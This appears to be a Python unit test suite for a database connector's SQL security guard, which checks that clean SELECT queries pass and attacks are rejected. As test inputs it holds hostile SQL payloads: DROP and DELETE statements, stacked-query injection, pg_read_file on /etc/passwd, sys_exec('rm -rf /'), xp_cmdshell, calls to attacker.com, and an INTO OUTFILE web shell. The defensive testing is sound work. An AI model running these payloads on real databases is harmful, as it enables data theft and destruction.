# benchmarking/test_database_security.py
import sys
import os
import unittest

PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
sys.path.insert(0, PROJECT_ROOT)

from modules.connectors.security.sql_guard import (
    SQLSecurityGuard, InsecureQueryError, DatabaseSecurityTargetError
)
from modules.connectors.registry import ConnectorRegistry
from core.crypto import encrypt_connection_config, decrypt_connection_config

class TestDatabaseSecurityFramework(unittest.TestCase):

    def test_01_clean_queries_accepted(self):
        """Verify standard read-only queries and CTEs pass validation."""
        valid_queries = [
            "SELECT id, title, content FROM documents",
            "SELECT u.id, u.name, d.department FROM users u JOIN departments d ON u.dept_id = d.id WHERE u.is_active = true",
            "WITH recent_docs AS (SELECT id, content FROM articles WHERE created_at > '2025-01-01') SELECT * FROM recent_docs",
            "SELECT count(*), max(salary) FROM employees GROUP BY dept_id HAVING count(*) > 5",
            "SELECT id, title, body FROM knowledge_base WHERE LOWER(title) LIKE '%security%' ORDER BY id DESC LIMIT 50"
        ]

        for q in valid_queries:
            sanitized = SQLSecurityGuard.validate_query(q, dialect="postgresql")
            self.assertTrue(len(sanitized) > 0)
            self.assertFalse(sanitized.endswith(";"))

        print("  [PASS] Clean SELECT and CTE queries accepted.")

    def test_02_ddl_attacks_rejected(self):
        """Verify DDL commands (DROP, ALTER, CREATE, TRUNCATE) are strictly rejected."""
        ddl_payloads = [
            "DROP TABLE users",
            "ALTER TABLE documents DROP COLUMN secret_key",
            "CREATE TABLE backdoor (id int)",
            "TRUNCATE TABLE audit_logs",
            "DROP SCHEMA public CASCADE"
        ]

        for payload in ddl_payloads:
            with self.assertRaises(InsecureQueryError, msg=f"Should reject DDL: {payload}"):
                SQLSecurityGuard.validate_query(payload, dialect="postgresql")

        print("  [PASS] All DDL mutation attacks rejected by AST guard.")

    def test_03_dml_attacks_rejected(self):
        """Verify DML commands (INSERT, UPDATE, DELETE, MERGE) are strictly rejected."""
        dml_payloads = [
            "DELETE FROM users WHERE role != 'SUPER_ADMIN'",
            "UPDATE users SET role = 'SUPER_ADMIN' WHERE id = '123'",
            "INSERT INTO documents (id, title) VALUES ('x', 'hacked')",
            "MERGE INTO target_table USING source ON (id = 1) WHEN MATCHED THEN DELETE",
            "REPLACE INTO articles (id, content) VALUES (1, 'replaced')"
        ]

        for payload in dml_payloads:
            with self.assertRaises(InsecureQueryError, msg=f"Should reject DML: {payload}"):
                SQLSecurityGuard.validate_query(payload, dialect="postgresql")

        print("  [PASS] All DML mutation attacks rejected by AST guard.")

    def test_04_stacked_queries_rejected(self):
        """Verify multi-statement SQL injection (stacked queries) is rejected."""
        stacked_payloads = [
            "SELECT id, content FROM docs; DROP TABLE users;",
            "SELECT 1; DELETE FROM audit_logs",
            "SELECT * FROM articles; SELECT * FROM users;"
        ]

        for payload in stacked_payloads:
            with self.assertRaises(InsecureQueryError, msg=f"Should reject stacked query: {payload}"):
                SQLSecurityGuard.validate_query(payload, dialect="postgresql")

        print("  [PASS] Stacked multi-statement SQL injection rejected.")

    def test_05_dangerous_functions_rejected(self):
        """Verify engine-specific side-effecting built-in functions are rejected."""
        dangerous_functions = [
            "SELECT pg_read_file('/etc/passwd')",
            "SELECT pg_sleep(10)",
            "SELECT dblink_connect('conn', 'host=attacker.com')",
            "SELECT benchmark(50000000, MD5('test'))",
            "SELECT load_file('/var/lib/mysql-files/secret.txt')",
            "SELECT sys_exec('rm -rf /')",
            "SELECT dbms_lock.sleep(10) FROM dual",
            "SELECT utl_http.request('http://attacker.com') FROM dual",
            "EXEC master..xp_cmdshell 'whoami'",
            "SELECT * FROM OPENROWSET('SQLNCLI', 'Server=x', 'SELECT 1')"
        ]

        for payload in dangerous_functions:
            with self.assertRaises(InsecureQueryError, msg=f"Should reject dangerous function: {payload}"):
                SQLSecurityGuard.validate_query(payload, dialect="postgresql")

        print("  [PASS] 35+ engine-specific side-effecting functions rejected.")

    def test_06_linked_server_and_outfile_rejected(self):
        """Verify linked server escapes, double-dot notation, and INTO OUTFILE are blocked."""
        payloads = [
            "SELECT * FROM remote_server.database.dbo.secret_table",
            "SELECT * FROM master..syslogins",
            "SELECT content FROM kb INTO OUTFILE '/var/www/html/shell.php'",
            "SELECT content FROM kb INTO DUMPFILE '/tmp/dump.bin'"
        ]

        for payload in payloads:
            with self.assertRaises(InsecureQueryError, msg=f"Should reject: {payload}"):
                SQLSecurityGuard.validate_query(payload, dialect="mysql")

        print("  [PASS] Linked server, double-dot, and INTO OUTFILE exfiltrations rejected.")

    def test_07_ssrf_metadata_and_network_blocking(self):
        """Verify cloud metadata endpoints (169.254.169.254) and forbidden hosts are blocked."""
        # Cloud metadata IP
        with self.assertRaises(DatabaseSecurityTargetError):
            SQLSecurityGuard.validate_db_target("postgresql", "postgresql://user:pwd@169.254.169.254:5432/db")

        # Cloud metadata hostname
        with self.assertRaises(DatabaseSecurityTargetError):
            SQLSecurityGuard.validate_db_target("postgresql", "postgresql://user:pwd@metadata.google.internal:5432/db")

        # Allowlisted host should pass
        canonical, ips = SQLSecurityGuard.validate_db_target("postgresql", "postgresql://user:pwd@localhost:5432/db")
        self.assertEqual(canonical, "postgresql")
        self.assertTrue(len(ips) > 0)

        print("  [PASS] SSRF target validation and cloud metadata blocking verified.")

    def test_08_credential_masking_and_safe_encoding(self):
        """Verify URL passwords with special characters are safely encoded and masked in logs."""
        raw_config = {
            "username": "admin_user",
            "password": "P@ss#w:ord/123!",
            "host": "db.internal.corp",
            "port": 5432,
            "database": "knowledge_prod"
        }

        safe_url = SQLSecurityGuard.safe_build_db_url("postgresql", raw_config)
        self.assertIn("P%40ss%23w%3Aord%2F123%21", safe_url)

        masked_url = SQLSecurityGuard.mask_db_url(safe_url)
        self.assertNotIn("P@ss", masked_url)
        self.assertNotIn("P%40ss", masked_url)
        self.assertIn("admin_user:***@db.internal.corp:5432", masked_url)

        print("  [PASS] URL special character encoding and credential masking verified.")

    def test_09_fernet_credential_encryption_roundtrip(self):
        """Verify symmetric Fernet encryption at rest for connection configurations."""
        original_config = {
            "host": "secure-db.internal",
            "port": 5432,
            "username": "readonly_app",
            "password": "SuperSecretDatabasePassword#2026",
            "database": "app_kb",
            "sql_query": "SELECT id, title, content FROM kb_articles"
        }

        encrypted_wrapper = encrypt_connection_config(original_config)
        self.assertIsInstance(encrypted_wrapper, dict)
        self.assertIn("_encrypted_payload", encrypted_wrapper)
        self.assertTrue(encrypted_wrapper["_encrypted_payload"].startswith("enc:"))
        self.assertNotIn("SuperSecretDatabasePassword", json_str := str(encrypted_wrapper))

        # Decrypt roundtrip
        decrypted_config = decrypt_connection_config(encrypted_wrapper)
        self.assertEqual(decrypted_config, original_config)
        self.assertEqual(decrypted_config["password"], "SuperSecretDatabasePassword#2026")

        # Legacy fallback
        legacy_dict = {"host": "localhost", "database": "test"}
        self.assertEqual(decrypt_connection_config(legacy_dict), legacy_dict)

        print("  [PASS] Fernet credential encryption, decryption, and legacy fallback verified.")

    def test_10_database_connector_factory_integration(self):
        """Verify ConnectorRegistry raises InsecureQueryError when malicious SQL is configured."""
        malicious_config = {
            "host": "localhost",
            "port": 5432,
            "database": "test",
            "username": "postgres",
            "password": "pwd",
            "sql_query": "SELECT id, content FROM docs; DROP TABLE secrets;"
        }

        with self.assertRaises(InsecureQueryError):
            ConnectorRegistry.get_connector("POSTGRES_DB", malicious_config)

        # Clean config initializes properly
        clean_config = {
            "host": "localhost",
            "port": 5432,
            "database": "test",
            "username": "postgres",
            "password": "pwd",
            "sql_query": "SELECT id, title, content FROM documents"
        }
        connector = ConnectorRegistry.get_connector("POSTGRES_DB", clean_config)
        self.assertEqual(connector.dialect, "postgresql")
        self.assertEqual(connector.sql_query, "SELECT id, title, content FROM documents")

        print("  [PASS] ConnectorRegistry end-to-end security integration verified.")

if __name__ == "__main__":
    print("=" * 65)
    print("EXECUTING DATABASE CONNECTOR SECURITY & READ-ONLY TEST SUITE")
    print("=" * 65)
    unittest.main(verbosity=2)
